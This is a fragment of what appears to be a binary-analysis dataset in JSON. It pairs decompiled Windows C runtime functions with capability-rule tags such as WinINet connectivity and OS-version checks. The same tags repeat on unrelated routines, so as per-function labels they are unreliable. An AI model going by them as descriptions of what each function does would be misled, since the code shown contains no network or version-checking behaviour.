{\ncode_r0x004708e5:\n        *(unaff_EBP + -0x79) = 0;\n        *(unaff_EBP + -0x8c) = 0;\n        if (uVar11 != 0) {\ncode_r0x004708f4:\n            if (uVar11 != 10) goto code_r0x004708f8;\n        }\n    }\n    fcn.004036e8(1, *(unaff_EBP + -0x8c));\n    *(unaff_EBP + -4) = 1;\n    iVar13 = 0;\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x94) + 0x1f;\n    cVar3 = fcn.00401a9b(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        do {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00405c40();\n            }\n            uVar12 = fcn.00401735(unaff_EBP + -0x48, *(iVar8 + 6));\n            if (uVar12 < *(unaff_EBP + -0x80)) {\n                cVar1 = *(unaff_EBP + -0x7a);\n                cVar3 = \"0123456789ABCDEFabcdef-+Xx\"[uVar12];\n                pcVar9 = *(unaff_EBP + -0x84);\n                *pcVar9 = cVar3;\n                if (((cVar1 != '\\0') || (cVar3 != '0')) && (pcVar9 < *(unaff_EBP + -0x8c))) {\n                    *(unaff_EBP + -0x7a) = 1;\n                    *(unaff_EBP + -0x84) = pcVar9 + 1;\n                }\n                iVar6 = unaff_EBP + -0x60;\n                *(unaff_EBP + -0x79) = 1;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    iVar6 = *(unaff_EBP + -0x60);\n                }\n                if (*(iVar6 + iVar13) != '\\x7f') {\n                    iVar6 = unaff_EBP + -0x60;\n                    if (0xf < *(unaff_EBP + -0x4c)) {\n                        iVar6 = *(unaff_EBP + -0x60);\n                    }\n                    *(iVar6 + iVar13) = *(iVar6 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                uVar12 = *(unaff_EBP + -0x4c);\n                iVar6 = *(unaff_EBP + -0x60);\n                iVar7 = unaff_EBP + -0x60;\n                if (0xf < uVar12) {\n                    iVar7 = iVar6;\n                }\n                if ((*(iVar7 + iVar13) == '\\0') || (*(unaff_EBP + -0x90) == 0)) goto code_r0x00470a30;\n                iVar4 = *(iVar8 + 6);\n                if (*(iVar8 + 4) == '\\0') {\n                    fcn.00405c40();\n                    iVar4 = *(iVar8 + 6);\n                    uVar12 = *(unaff_EBP + -0x4c);\n                    iVar6 = *(unaff_EBP + -0x60);\n                }\n                if (iVar4 != *(unaff_EBP + -0x90)) goto code_r0x00470a30;\n                fcn.00404476(0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.004047a5();\n            cVar3 = fcn.00401a9b(*(unaff_EBP + -0x88));\n        } while (cVar3 == '\\0');\n        uVar12 = *(unaff_EBP + -0x4c);\n        iVar6 = *(unaff_EBP + -0x60);\ncode_r0x00470a30:\n        if (iVar13 != 0) {\n            iVar8 = unaff_EBP + -0x60;\n            if (0xf < uVar12) {\n                iVar8 = iVar6;\n            }\n            if (*(iVar8 + iVar13) < '\\x01') {\n                cVar3 = '\\0';\n                goto code_r0x00470a54;\n            }\n            iVar13 = iVar13 + 1;\n        }\n    }\n    else {\n        uVar12 = *(unaff_EBP + -0x4c);\n        iVar6 = *(unaff_EBP + -0x60);\n    }\n    cVar3 = *(unaff_EBP + -0x79);\ncode_r0x00470a54:\n    pcVar9 = unaff_EBP + -0x78;\n    if (0xf < *(unaff_EBP + -100)) {\n        pcVar9 = *(unaff_EBP + -0x78);\n    }\n    if (cVar3 == '\\0') {\ncode_r0x00470acb:\n        puVar10 = *(unaff_EBP + -0x94);\n    }\n    else {\n        while ((iVar13 != 0 && (cVar3 = *pcVar9,  cVar3 != '\\x7f'))) {\n            iVar13 = iVar13 + -1;\n            if (iVar13 != 0) {\n                *(unaff_EBP + -0x80) = unaff_EBP + -0x60;\n                if (0xf < uVar12) {\n                    uVar12 = *(unaff_EBP + -0x4c);\n                    *(unaff_EBP + -0x80) = *(unaff_EBP + -0x60);\n                }\n                iVar6 = *(unaff_EBP + -0x60);\n                if (cVar3 != *(*(unaff_EBP + -0x80) + iVar13)) goto code_r0x00470acb;\n            }\n            if (iVar13 == 0) {\n                *(unaff_EBP + -0x80) = unaff_EBP + -0x60;\n                if (0xf < *(unaff_EBP + -0x4c)) {\n                    *(unaff_EBP + -0x80) = iVar6;\n                }\n                uVar12 = *(unaff_EBP + -0x4c);\n                if (cVar3 < **(unaff_EBP + -0x80)) goto code_r0x00470acb;\n            }\n            if ('\\0' < pcVar9[1]) {\n                pcVar9 = pcVar9 + 1;\n            }\n        }\n        puVar10 = *(unaff_EBP + -0x84);\n        if (*(unaff_EBP + -0x7a) == '\\0') {\n            *puVar10 = 0x30;\n            puVar10 = puVar10 + 1;\n        }\n    }\n    *puVar10 = 0;\n    fcn.004029b9();\n    fcn.004029b9();\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 3031
    },
    "00404755": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004b85f8)\n// WARNING: Removing unreachable block (ram,0x004b85d3)\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00404755(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t extraout_ECX;\n    uint32_t *puVar3;\n    uint32_t extraout_ECX_00;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    ulong uVar11;\n    uint64_t uVar12;\n    int64_t iVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint var_21ch;\n    uint var_218h;\n    uint32_t *var_4ch;\n    uint32_t var_48h;\n    int32_t var_44h;\n    uint32_t var_40h;\n    uint32_t *var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t **var_1ch;\n    uint32_t *var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar7 = *arg_8h;\n    if ((uVar7 != 0) && (var_34h = *arg_ch,  var_34h != 0)) {\n        uVar5 = var_34h - 1;\n        uVar2 = uVar7 - 1;\n        if (uVar5 == 0) {\n            var_8h = arg_ch[1];\n            if (var_8h == 1) {\n                uVar7 = arg_8h[1];\n                *arg_8h = 0;\n                fcn.004b9f7c(arg_8h + 1, 0x1cc, &var_218h, 0);\n                return uVar7;\n            }\n            if (uVar2 == 0) {\n                uVar7 = arg_8h[1];\n                *arg_8h = 0;\n                fcn.004b9f7c(arg_8h + 1, 0x1cc, &var_218h, 0);\n                uVar5 = uVar7 % var_8h;\n                arg_8h[1] = uVar5;\n                *arg_8h = uVar5 != 0;\n                return uVar7 / var_8h;\n            }\n            uVar5 = 0;\n            var_ch = 0;\n            var_24h = 0;\n            var_18h = NULL;\n            if (uVar2 != 0xffffffff) {\n                var_1ch = arg_8h + uVar7;\n                puVar3 = arg_8h;\n                do {\n                    puVar1 = puVar3;\n                    puVar3 = *var_1ch;\n                    uVar11 = fcn.00401820(puVar3, uVar5, var_8h, 0, puVar1);\n                    var_40h = uVar11 >> 0x20;\n                    var_24h = var_ch;\n                    var_1ch = var_1ch + -1;\n                    uVar7 = uVar7 - 1;\n                    uVar5 = extraout_ECX;\n                    var_18h = puVar1;\n                    var_ch = uVar11;\n                } while (uVar7 != 0);\n            }\n            *arg_8h = 0;\n            fcn.004b9f7c(arg_8h + 1, 0x1cc, &var_218h, 0);\n            arg_8h[1] = uVar5;\n            arg_8h[2] = var_18h;\n            *arg_8h = (var_18h != NULL) + 1;\n            return CONCAT44(var_24h, var_ch);\n        }\n        if (uVar5 <= uVar2) {\n            iVar6 = uVar2 - uVar5;\n            if (iVar6 <= uVar2) {\n                puVar3 = arg_8h + uVar7;\n                puVar1 = arg_ch + var_34h;\n                uVar7 = uVar2;\n                do {\n                    if (*puVar1 != *puVar3) {\n                        if (*puVar3 <= *puVar1) goto code_r0x004b844c;\n                        break;\n                    }\n                    uVar7 = uVar7 - 1;\n                    puVar1 = puVar1 + -1;\n                    puVar3 = puVar3 + -1;\n                } while (iVar6 <= uVar7);\n            }\n            iVar6 = iVar6 + 1;\ncode_r0x004b844c:\n            if (iVar6 != 0) {\n                var_30h = arg_ch[var_34h];\n                var_20h = arg_ch[var_34h - 1];\n                var_ch = 0x1f;\n                if (var_30h != 0) {\n                    for (; var_30h >> var_ch == 0; var_ch = var_ch + -1) {\n                    }\n                }\n                if (var_30h == 0) {\n                    var_ch = 0x20;\n                }\n                else {\n                    var_ch = 0x1f - var_ch;\n                }\n                var_2ch = 0x20 - var_ch;\n                if (var_ch != 0) {\n                    uVar7 = var_20h >> (var_2ch & 0x1f);\n                    var_20h = var_20h << (var_ch & 0x1f);\n                    var_30h = var_30h << (var_ch & 0x1f) | uVar7;\n                    if (2 < var_34h) {\n                        var_20h = var_20h | arg_ch[var_34h - 2] >> (var_2ch & 0x1f);\n                    }\n                }\n                var_1ch = NULL;\n                var_18h = iVar6 + -1;\n                uVar8 = 0;\n                var_8h = uVar2;\n                if (-1 < var_18h) {\n                    var_38h = var_18h + var_34h;\n                    var_3ch = arg_8h + iVar6;\n                    var_4ch = arg_8h + (var_38h - 1);\n                    do {\n                        if (var_8h < var_38h) {\n                            var_48h = 0;\n                        }\n                        else {\n                            var_48h = var_4ch[2];\n                        }\n                        uVar7 = var_4ch[1];\n                        var_14h = *var_4ch;\n                        var_24h = 0;\n                        var_4h = var_48h;\n                        if (var_ch != 0) {\n                            uVar7 = var_14h >> (var_2ch & 0x1f);\n                            uVar11 = fcn.004040a7();\n                            var_4h = uVar11 >> 0x20;\n                            uVar7 = uVar7 | uVar11;\n                            var_14h = var_14h << (var_ch & 0x1f);\n                            if (2 < var_38h) {\n                                var_14h = var_14h | arg_8h[var_34h + var_18h + -2] >> (var_2ch & 0x1f);\n                            }\n                        }\n                        uVar12 = fcn.00401820(uVar7, var_4h, var_30h, 0, arg_8h);\n                        var_24h = 0;\n                        uVar15 = extraout_ECX_00;\n                        if (uVar12 >> 0x20 != 0) {\n                            _var_44h = uVar12;\n                            iVar13 = fcn.0040262b(uVar12 - 0xffffffff, var_30h, 0);\n                            var_10h = uVar12 >> 0x20;\n                            var_4h = uVar12;\n                            uVar15 = iVar13 + 4;\n                            uVar12 = 0xffffffff;\n                        }\n                        var_24h = uVar15 >> 0x20;\n                        while (_var_44h = uVar12,  var_24h == 0) {\n                            var_10h = uVar12 >> 0x20;\n                            var_44h = uVar12;\n                            iVar6 = var_44h;\n                            var_24h = uVar15 >> 0x20;\n                            uVar7 = uVar15;\n                            var_40h = var_10h;\n                            var_4h = var_14h;\n                            uVar15 = uVar12;\n                            uVar14 = fcn.0040262b();\n                            var_10h = uVar15 >> 0x20;\n                            var_44h = uVar15;\n                            _var_44h = uVar15 & 0xffffffff | var_40h << 0x20;\n                            uVar12 = uVar15 & 0xffffffff00000000 | uVar12 & 0xffffffff;\n                            if (uVar14 <= CONCAT44(uVar7, var_4h)) break;\n                            uVar12 = CONCAT44(var_10h + -1 + (iVar6 != 0), iVar6 + -1);\n                            var_24h = var_24h + CARRY4(uVar7, var_30h);\n                            uVar15 = CONCAT44(var_24h, uVar7 + var_30h);\n                        }\n                        var_40h = _var_44h >> 0x20;\n                        if (uVar12 != 0) {\n                            uVar5 = 0;\n                            uVar7 = 0;\n                            if (var_34h != 0) {\n                                puVar1 = arg_ch + 1;\n                                var_14h = var_34h;\n                                puVar3 = var_3ch;\n                                do {\n                                    iVar13 = (_var_44h & 0xffffffff) * *puVar1;\n                                    uVar2 = iVar13;\n                                    uVar9 = uVar5 + uVar2;\n                                    uVar5 = uVar7 + (iVar13 >> 0x20) + var_40h * *puVar1 + CARRY4(uVar5, uVar2);\n                                    uVar7 = 0;\n                                    if (*puVar3 < uVar9) {\n                                        bVar10 = 0xfffffffe < uVar5;\n                                        uVar5 = uVar5 + 1;\n                                        uVar7 = bVar10;\n                                    }\n                                    *puVar3 = *puVar3 - uVar9;\n                                    puVar3 = puVar3 + 1;\n                                    puVar1 = puVar1 + 1;\n                                    var_14h = var_14h - 1;\n                                } while (var_14h != 0);\n                            }\n                            if ((uVar7 != 0) || (var_48h < uVar5)) {\n                                if (var_34h != 0) {\n                                    uVar5 = 0;\n                                    puVar1 = var_3ch;\n                                    uVar7 = var_34h;\n                                    puVar3 = arg_ch;\n                                    do {\n                                        puVar3 = puVar3 + 1;\n                                        uVar2 = *puVar1;\n                                        uVar9 = *puVar3;\n                                        uVar4 = uVar2 + *puVar3;\n                                        *puVar1 = uVar4 + uVar5;\n                                        uVar5 = CARRY4(uVar2, uVar9) + CARRY4(uVar4, uVar5);\n                                        uVar7 = uVar7 - 1;\n                                        puVar1 = puVar1 + 1;\n                                    } while (uVar7 != 0);\n                                }\n                                uVar12 = uVar12 - 1;\n                            }\n                            var_8h = var_38h - 1;\n                        }\n                        var_10h = uVar12 >> 0x20;\n                        var_3ch = var_3ch + -1;\n                        var_18h = var_18h + -1;\n                        var_4ch = var_4ch + -1;\n                        var_38h = var_38h - 1;\n                        uVar8 = var_1ch;\n                        var_1ch = uVar12;\n                    } while (-1 < var_18h);\n                }\n                uVar7 = var_8h + 1;\n                if (uVar7 < *arg_8h) {\n                    puVar3 = arg_8h + var_8h + 2;\n                    uVar5 = uVar7;\n                    do {\n                        *puVar3 = 0;\n                        puVar3 = puVar3 + 1;\n                        uVar5 = uVar5 + 1;\n                    } while (uVar5 < *arg_8h);\n                }\n                *arg_8h = uVar7;\n                while ((uVar7 != 0 && (arg_8h[uVar7] == 0))) {\n                    uVar7 = uVar7 - 1;\n                    *arg_8h = uVar7;\n                }\n                return CONCAT44(uVar8, var_1ch);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 3062
    },
    "0040475a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040475a(void)\n\n{\n    uint in_MXCSR;\n    uint var_4h;\n    \n    if (0 < *0x56ec4c) {\n        return in_MXCSR;\n    }\n    return 0;\n}\n",
        "token_count": 56
    },
    "0040475f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040475f(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405eed(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "004047eb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004047eb(uint *param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 1) != '\\0') {\n        return *param_1;\n    }\n    fcn.004035f8(L\"_is_double\", L\"__crt_strtox::floating_point_value::as_double\", \n                 L\"minkernel\\\\crts\\\\ucrt\\\\inc\\\\corecrt_internal_strtox.h\", 0x19f, 0);\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 145
    },
    "00404845": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00404845(void)\n\n{\n    uint arg_10h;\n    \n    if (*0x5704ab == '\\0') {\n        *0x5704a0 = 0x56cfb0;\n        *0x57049c = 0x56d378;\n        *0x570498 = 0x56d240;\n        arg_10h = fcn.0040558d();\n        fcn.004c5fc7(0xfffffffd, 1, arg_10h, 0x5704a0);\n        *0x5704ab = '\\x01';\n    }\n    return 1;\n}\n",
        "token_count": 142
    },
    "004c8e63": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.004c8e63(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    \n    if (arg_8h == '\\0') {\n        piVar1 = 0x5704b0;\n        do {\n            if (*piVar1 != 0) {\n                if (*piVar1 != -1) {\n                    (*_sym.imp.KERNEL32.dll_FreeLibrary)(*piVar1);\n                }\n                *piVar1 = 0;\n            }\n            piVar1 = piVar1 + 1;\n        } while (piVar1 != 0x570500);\n    }\n    return 1;\n}\n",
        "token_count": 142
    },
    "004048d1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004048d1(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0040288d(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 352
    },
    "00477163": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00477163(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint32_t *arg_20h, \n            float *arg_24h)\n\n{\n    uint32_t *puVar1;\n    float *pfVar2;\n    char cVar3;\n    uint arg_10h_00;\n    uint in_ECX;\n    uint unaff_EBX;\n    float10 fVar4;\n    int32_t var_32ch;\n    uint *var_328h;\n    float fStack808;\n    int32_t var_320h;\n    uint var_31ch;\n    uint32_t var_4h;\n    \n    pfVar2 = arg_24h;\n    puVar1 = arg_20h;\n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_320h = 1000000000;\n    arg_10h_00 = fcn.0040579f(in_ECX, &var_31ch, &arg_ch, &arg_14h, arg_1ch, &var_320h);\n    if (var_31ch == '\\0') {\ncode_r0x00477221:\n        fVar4 = 0;\n        *puVar1 = 2;\n    }\n    else {\n        fVar4 = fcn.00401924(&var_31ch, &var_328h, arg_10h_00, &var_32ch);\n        fStack808 = fVar4;\n        *pfVar2 = fStack808;\n        if ((var_328h == &var_31ch) || (var_32ch != 0)) goto code_r0x00477221;\n        if ((var_320h == 1000000000) || (var_320h == 0)) goto code_r0x0047722d;\n        fVar4 = fcn.00401b5e(fStack808, var_320h << 2);\n    }\n    *pfVar2 = fVar4;\ncode_r0x0047722d:\n    cVar3 = fcn.0040640b(&arg_14h);\n    if (cVar3 != '\\0') {\n        *puVar1 = *puVar1 | 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    fcn.00403085(unaff_EBX);\n    return;\n}\n",
        "token_count": 566
    },
    "0040493f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040493f(uint arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    int32_t in_ECX;\n    \n    fcn.00404fcf();\n    *(in_ECX + 0x3c) = 0;\n    *(in_ECX + 0x38) = arg_8h;\n    uVar1 = fcn.004052a4(0x20);\n    *(in_ECX + 0x40) = uVar1;\n    if (*(in_ECX + 0x38) == 0) {\n        fcn.004032fb(*(in_ECX + 0xc) | 4, 0);\n    }\n    if (arg_ch != '\\0') {\n        fcn.00402e91(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "004ca544": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004ca544(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint32_t uVar26;\n    uint uVar27;\n    int32_t iVar28;\n    uint8_t *puVar29;\n    uint8_t *puVar30;\n    int32_t var_18h;\n    uint var_14h;\n    uint8_t **var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_ch = NULL;\n    var_18h = arg_8h;\n    var_14h = 0;\n    if ((*(arg_8h + 0xac) == 0) && (*(arg_8h + 0xb0) == 0)) {\n        var_8h = NULL;\n        puVar4 = 0x56cd10;\ncode_r0x004ca8af:\n        puVar5 = var_ch;\n        piVar3 = *(arg_8h + 0x84);\n        if (piVar3 != NULL) {\n            LOCK();\n            *piVar3 = *piVar3 + -1;\n        }\n        piVar3 = *(arg_8h + 0x7c);\n        if (piVar3 != NULL) {\n            LOCK();\n            iVar28 = *piVar3;\n            *piVar3 = iVar28 + -1;\n            if (iVar28 + -1 == 0) {\n                fcn.00406302(*(arg_8h + 0x88));\n                fcn.00406302(*(arg_8h + 0x7c));\n            }\n        }\n        *(arg_8h + 0x7c) = var_8h;\n        uVar27 = 0;\n        *(arg_8h + 0x84) = puVar5;\n        *(arg_8h + 0x88) = puVar4;\n    }\n    else {\n        puVar4 = fcn.00404fd9(1, 0x50);\n        var_4h = puVar4;\n        fcn.00406302(0);\n        if (puVar4 != NULL) {\n            puVar5 = fcn.00404fd9(1, 4);\n            var_8h = puVar5;\n            fcn.00406302(0);\n            if (puVar5 == NULL) {\n                fcn.00406302(puVar4);\n            }\n            else {\n                if (*(arg_8h + 0xac) == 0) {\n                    puVar4 = 0x56cd10;\n                    puVar5 = var_4h;\n                    for (iVar28 = 0x14; iVar28 != 0; iVar28 = iVar28 + -1) {\n                        *puVar5 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar5 = puVar5 + 1;\n                    }\ncode_r0x004ca861:\n                    *var_4h = **(arg_8h + 0x88);\n                    var_4h[1] = *(*(arg_8h + 0x88) + 4);\n                    var_4h[2] = *(*(arg_8h + 0x88) + 8);\n                    var_4h[0xc] = *(*(arg_8h + 0x88) + 0x30);\n                    var_4h[0xd] = *(*(arg_8h + 0x88) + 0x34);\n                    *var_8h = 1;\n                    puVar4 = var_4h;\n                    if (var_ch != NULL) {\n                        *var_ch = 1;\n                    }\n                    goto code_r0x004ca8af;\n                }\n                puVar5 = fcn.00404fd9(1, 4);\n                var_ch = puVar5;\n                fcn.00406302(0);\n                if (puVar5 == NULL) {\n                    fcn.00406302(puVar4);\n                    fcn.00406302(var_8h);\n                }\n                else {\n                    uVar27 = *(arg_8h + 0xac);\n                    uVar6 = fcn.00401acd(&var_18h, 1, uVar27, 0x15, puVar4 + 3);\n                    uVar7 = fcn.00401acd(&var_18h, 1, uVar27, 0x14, var_4h + 4);\n                    uVar8 = fcn.00401acd(&var_18h, 1, uVar27, 0x16, var_4h + 5);\n                    uVar9 = fcn.00401acd(&var_18h, 1, uVar27, 0x17, var_4h + 6);\n                    var_10h = var_4h + 7;\n                    uVar10 = fcn.00401acd(&var_18h, 1, uVar27, 0x18, var_10h);\n                    uVar11 = fcn.00401acd(&var_18h, 1, uVar27, 0x50, var_4h + 8);\n                    uVar12 = fcn.00401acd(&var_18h, 1, uVar27, 0x51, var_4h + 9);\n                    uVar13 = fcn.00401acd(&var_18h, 0, uVar27, 0x1a, var_4h + 10);\n                    uVar14 = fcn.00401acd(&var_18h, 0, uVar27, 0x19, var_4h + 0x29);\n                    uVar15 = fcn.00401acd(&var_18h, 0, uVar27, 0x54, var_4h + 0x2a);\n                    uVar16 = fcn.00401acd(&var_18h, 0, uVar27, 0x55, var_4h + 0x2b);\n                    uVar17 = fcn.00401acd(&var_18h, 0, uVar27, 0x56, var_4h + 0xb);\n                    uVar18 = fcn.00401acd(&var_18h, 0, uVar27, 0x57, var_4h + 0x2d);\n                    uVar19 = fcn.00401acd(&var_18h, 0, uVar27, 0x52, var_4h + 0x2e);\n                    uVar20 = fcn.00401acd(&var_18h, 0, uVar27, 0x53, var_4h + 0x2f);\n                    uVar21 = fcn.00401acd(&var_18h, 2, uVar27, 0x15, var_4h + 0xe);\n                    uVar22 = fcn.00401acd(&var_18h, 2, uVar27, 0x14, var_4h + 0xf);\n                    uVar23 = fcn.00401acd(&var_18h, 2, uVar27, 0x16, var_4h + 0x10);\n                    uVar24 = fcn.00401acd(&var_18h, 2, uVar27, 0x17, var_4h + 0x11);\n                    uVar25 = fcn.00401acd(&var_18h, 2, uVar27, 0x50, var_4h + 0x12);\n                    uVar26 = fcn.00401acd(&var_18h, 2, uVar27, 0x51, var_4h + 0x13);\n                    puVar4 = var_4h;\n                    if ((uVar26 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 | uVar13 | uVar14 | uVar15 |\n                                  uVar16 | uVar17 | uVar18 | uVar19 | uVar20 | uVar21 | uVar22 | uVar23 | uVar24 |\n                                  uVar25) == 0) {\n                        puVar29 = *var_10h;\n                        while (uVar2 = *puVar29,  uVar2 != 0) {\n                            if (uVar2 - 0x30 < 10) {\n                                *puVar29 = uVar2 - 0x30;\ncode_r0x004ca837:\n                                puVar29 = puVar29 + 1;\n                            }\n                            else {\n                                puVar30 = puVar29;\n                                if (uVar2 != 0x3b) goto code_r0x004ca837;\n                                do {\n                                    puVar1 = puVar30 + 1;\n                                    *puVar30 = *puVar1;\n                                    puVar30 = puVar30 + 1;\n                                } while (*puVar1 != 0);\n                            }\n                        }\n                        goto code_r0x004ca861;\n                    }\n                    fcn.004033cd(var_4h);\n                    fcn.00406302(puVar4);\n                    fcn.00406302(var_8h);\n                    fcn.00406302(var_ch);\n                }\n            }\n        }\n        uVar27 = 1;\n    }\n    return uVar27;\n}\n",
        "token_count": 2286
    },
    "004049e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
